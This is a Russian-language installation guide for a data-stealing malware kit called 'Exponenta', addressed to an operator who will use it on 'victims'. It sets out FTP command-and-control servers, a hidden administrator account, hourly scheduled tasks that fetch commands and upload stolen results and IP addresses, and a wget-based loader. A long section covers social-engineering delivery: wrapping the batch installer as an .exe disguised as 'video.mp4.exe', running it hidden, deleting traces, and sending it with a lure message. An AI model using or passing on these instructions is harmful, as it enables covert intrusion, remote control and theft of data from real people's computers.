ИНСТАЛЛЯЦИЯ СТАЙЛЕРА «ЭКСПОНЕНТА»
====

В каталоге содержатся дистрибутивы, необходимые для установки FTP-версии стайлера. Представлены варианты для офлайн и онлайн установки. Файлы используются как в академическом, так и «боевом» варианте стайлера. Файлы дистрибутива рабочие, но пока не тестировались в бета-версии.

Принцип работы программы
-----

После инсталляции файлов стайлера в окружении операционной системы появляются следующие переменные:

- _Hacker_User_ – имя (логин) учётной записи компьютера-жертвы на ftp серверах хозяина, с которых будет управляться стайлер

- _Hacker_Pass_ – пароль для этой учётной записи. Задаётся, чтобы посторонние не имели доступа к данным жертвы на сервере хозяина. Внимание! Пароль храниться в незащищённом виде! Просто автор не нашёл способа безопасного использования хеша и солей в программах удалённого доступа.

- _Hacker_host1_ – доменное имя публичного хоста, с которого скачивается установочные файлы и публичные обновления стайлера. Значение совпадает со значением следующей переменной, когда используется только один хост.

- _Hacker_host2_ – доменное имя приватного хоста, с которого скачиваются в офлайн-режиме команды управления стайлером и на который передаются результаты его работы. Также создаётся учётная запись с именем MyAdminAccount для возможного удалённого подключения к компьютеру, а также добавляется задание для текущего пользователя на запуск каждый час файла onsysload, в котором расположены текущие команды управления стайлером.

На приватном хосте создаются аккаунты пользователя-жертвы FTP сервера. В корень этого сервера будут «сваливаться» результаты работы стайлера на компьютере-жертве, а в папке Private будут расположены командные файлы, загружаемые на компьютер-жертву для управления им.

Рабочий каталог стайлера для компьютера-жертвы – c:\pub1\Util

При входе в аккаунт компьютера пользователя каждый час запускается на обработку файл onsysload. В файле присутствуют следующие обязательные части:

- ftp загрузка команд для исполнения на компьютере-жертве (например, новый файл user_hourly.bat или новый файл отправки данных)

- Определение внешнего IP адреса компьютера в Интернете;

- Переименование и отправка файла с IP адресом на сервер хозяина

Исходные данные
-----

Для установки стайлера “Экспонента” вам дополнительно потребуется следующее рабочее окружение:

- ftp-адрес публичного хостинга файлов стайлера. Хостинг выбирается произвольно, на Ваш вкус. Доменное имя этого публичного хостинга указывается в переменной Hacker_host1.

- ftp-адрес (хостинг, логин и пароль) — для управления компьютером жертвы. Создавать этот адрес нужно согласно указанным выше принципам работы стайлера, включая иерархию каталогов и круглосуточную доступность сервиса.

Исходя из вышесказанного, определитесь, нужно ли редактировать командные файлы этого проекта, или оставить  настройки по умолчанию. Если исправления всё-таки нужны, внесите изменения в клон проекта и пересоберите файлы дистрибутивов.

Организация веб-сервера Hacker_host1
----

На веб-сервере с доменным именем, сохранённой в переменной Hacker_host1, в корне создаётся папка: “Exponenta”. В ней содержится установщик стайлера, установщики плагинов и  инсталляторы. Учтите, что все файлы, расположенные в этом каталоге, будут скачены с сервера на компьютер жертвы без изменений! Это значит, что там будут только универсальные файлы, а кастомизация для каждого пользователя проводится отдельно при подготовке инсталлятора.

Файл, который устанавливает стайлер вместе с плагинами — InstallMainExponenta.bat Пример его кода приведён в этой папке. Этот файл рабочий, и используется для локальной установки стайлера путём запуска этого файла из командной строки с повышенными привилегиями. Для работы этот файл (в текущей редакции) требует наличие в том же каталоге файлов:

- ExponentaHTTPStylerMainFiles151SetupRePack.exe с главными файлами стайлера;

- HiddenStart450SetupRePack.exe с плагином-пакетом Hidden Start;

- ElevationExponentaPlugin202SetupRepack.exe с плагином-пакетом Elevation;

- chock.install.cmd – командный файл с инсталлятором пакета Chocolatey for Windows;

- choc_pack.install.cmd – командный файл с инсталляцией дополнительных программ через менеджер пакетов;

Это минимальный рабочий набор инсталлятора. Файлы присутствуют в каталоге Exponenta на сервере в обязательном порядке. Назначение других дополнительных файлов будет написано ниже.

В этом же каталоге присутствуют файлы descript.ion, INSTALL.MD, install1.md, install.rtf и install.html. Они несут только информационную нагрузку, и для работы стайлера не требуются.

Организация ftp-сервера Hacker_host2
---

На FTP сервере с доменным именем, сохранённом в переменной Hacker_host1, в корне должна создаётся папка: "Exponenta". В ней будут файлы установщика стайлера, установщикков плагинов и бинарные дистрибутивы. Учтите, что все файлы, расположенные в этом каталоге, будут скачены с сервера на компьютер жертвы без изменений! Это значит, там будут только универсальные файлы, а кастомизация пользователя должны проводиться отдельно при подготовке инсталлятора.

На этом сервере, в корне, присутствует папка Private, в которой хранятся файлы, с помощью которых ежечасно выполняются команды стайлера, выполняемые в офлайне. В этом наборе присутствуют файлы:

- user_hourly1.bat;

- user_dayly1.bat;

- user_onstart1.bat;

- sendfile.cmd,

- и _отсутствует_ файл ONSYSLOAD.BAT!


Результаты выполнения команд стайлер пересылает при помощи файла sendfile.cmd на сервер Hacker_host2 в корневой каталог аккаунта Hacker_User. Будьте внимательны, этот каталог *открыт для записи* авторизованному пользователю ftp-сервера по этому протоколу!

_Примечание_. Хотя на одном хосте возможно управление несколькими стайлерами сочетание Hacker_User/Hacker_host2 будет единственное для Интернета! Без этого условия стайлер работать не будет.


СОЗДАНИЕ ДИСТРИБУТИВА ДЛЯ РАСПРОСТРАНЕНИЯ МЕТОДОМ СОЦИАЛЬНОЙ ИНЖЕНЕРИИ
====


Устанавливать файлы стайлера локально или через удалённый доступ — неправильная идея со всех сторон. Поскольку пакет для работы требует Интернет, то и устанавливаться он должен также из Интернета. Ниже будет рассказано, как подготовить файл для загрузки пакета из Интернета и сокрытия установки методами социальной инженерии.


Подготовка установочного файла
----

Для «нормальной» установки стайлера в этом каталоге присутствуют файлы:

- load_distrib.bat — общий для всех файл, скачивающий и устанавливающий файлы дистрибутива стайлера «Экспонента»;

- load.bat — пример кастомизированного под конкретную жертву файла загрузки стайлера.

- wget.exe — собственно программа для скачки установочных файлов с сервера Hacker_host1

Назначение первого файла — открытие портов для FTP и веб-клиента, подготовка файла сценария и скачивание дистрибутива этим клиентом, а также запуск локального установщика стайлера. Информацию для этого пакетный файл получает из командной строки.

Единственное назначение второго файла — запуск первого файла с заполненными по умолчанию параметрами кастомизации. Дело в том, что запустить файл из Интернета с параметрами затруднительно, а с использованием методов социальной инженерии — невозможно. Только для этого и создан этот файл.

Формат этого файла следующий

Echo off
start load_distrib.bat «значение переменной Hacker_User» «значение переменной Hacker_Pass» «значение переменной Hacker_host1» «значение переменной Hacker_host2»

Теперь для запуска процесса инсталляции нужно, поместить оба файла в один каталог, и запустить файл load.bat с повышенными привилегиями. Вариант, как это сделать на практике, смотри ниже.


Подготовка файла для пересылки на компьютер жертвы
----

Подготовленные таким образом файлы устанавливают стайлер произвольной конфигурации на компьютер жертвы. Для этого запускается файл load.bat на компьютере жертвы из произвольного каталога, с повышенными привилегиями выполнения. Всё бы хорошо… Только переслать файл с таким расширением на компьютер жертвы будет проблематично, а запустить такой файл с повышенными привилегиями, в обычных условиях пользователю будет невозможно. Администратора такой файл насторожит, а лузеры не умеют запускать командные файлы.

К счастью для хакеров, есть программа для конверсии командных файлов в исполняемые файлы с расширением *.exe. Для установки программы подаётся команда:

choco install –y battoexeconverter

После установки запустите программу, откройте в её редакторе командный файл, задайте опции конвертирования, конечный каталог, и бинго! Будет создан исполняемый файл с той же функциональностью.

Перечислять опции и команды работы этого конвертера автор не будет – это тема отдельной статьи. Отметим, что файл после конвертации сможет:

1. Требовать запуска с повышенными привилегиями;

2. Инкапсулировать в себя как выполняемый командный файл, так и дополнительные командные и исполняемые файлы, архивы, видео, изображения, необходимые для его работы;

3. Сменить иконку приложения, отображаемую в Windows и файловых менеджерах. Это позволит скрывать факт запуска файла в стайлере и поможет файлу установщика стайлера «Экспонента» «притвориться», например, изображением или файлом видео;

4. Передавать указанный файл по ссылкам в социальных сетях или мессенджерах, а также электронной почте и других средствах обмена сообщениями между пользователями. Здесь принципиальное слово «по ссылке», поскольку программы обмена сообщениями не разрешают пересылать в теле командные и исполняемые файлы, как раз для предотвращения заражения. А переданный по ссылке командный файл нельзя ни скачать, ни запустить;

5. Назначить файлу установщика имя, например, video.mp4.exe. Как правило, по умолчанию Microsoft Windows скрывает окончания исполняемых файлов. В этом случае, при соблюдении пункта 3, этот файл будет похож на файл видео, например, с танцующими свиньями, и лузер может просто не заметить подмену. Особенно, если в дополнение к стайлеру скачается и покажется видео с танцующими свиньями.

6. Исполняемые файлы, конвертированные из командных, в зависимости от содержимого будут любого размера. В случае малого размера файла не предполагает выделения места на диске, и у пользователя или администратора создаётся ложное впечатление, что такая маленькая команда не принесёт вреда и не содержит в себе установщика. Что, на самом деле, не так;

7. Запускать установку в скрытом режиме, не показывая окна консоли;

8. Удалять после себя файлы, которые инкапсулированы в этот исполняемый файл;

9. Назначать рабочий каталог для выполнения, в том числе каталог с временными файлами. В этом случае обнаружить работу стайлера будет ещё труднее.

Таким образом, преобразовав командный файл установщика стайлера в исполняемый файл, перешлите его жертве по ссылке вместе с побуждающим текстом: «Ну, ка оцени, какое видео с танцующими свиньями я откопал!». По законам социальной инженерии, весьма вероятно откроет такое видео не только офисный лузер, но и его коллега – беспечный администратор. Не смотря на предупреждения отдела охраны и компьютерной безопасности. А нам то и надо!

А организовать загрузку и запуск видео для «отвода глаз» не трудно. Например, с помощью команд:

Wget «ссылка на файл с видео»
Start «файл видео»


Назначение инсталляционных файлов
=====

- Файл indtall_distrib.bat  — для офлайновой установки файлов стайлера. Используется только в тестовых целях или когда файлы проекта инкапсулируются в одну приманку. Будет общим для проекта.

- Файл load_distrib – файл загрузчика стайлера. Нужен, чтобы загрузить файлы дистрибутива стайлера онлайн с сайта Hacker_Host1. Будетя общим для проекта.

- Файл install.bat – пример кастомизируемого файла для запуска файла install_distrib. Параметры приведены только для примера, их нужно заменить своими значениями.

- Файл load.bat – пример кастомизируемого файла для запуска файла load_distrib.bat. См. примечание к предыдущему файлу.

- Файл duck-install.msi – дистрибутив программы duck для подключения к облачным хранилищам из командной строки. В этой версии стайлера не используется, просто официальный сайт программы заблокирован.

- wget.exe. Программа для скачивания дистрибутивов, используемая в файле load_distrib. Необходима в дистрибутиве стайлера, поскольку без неё скачивание дистрибутивов с сайта невозможно!
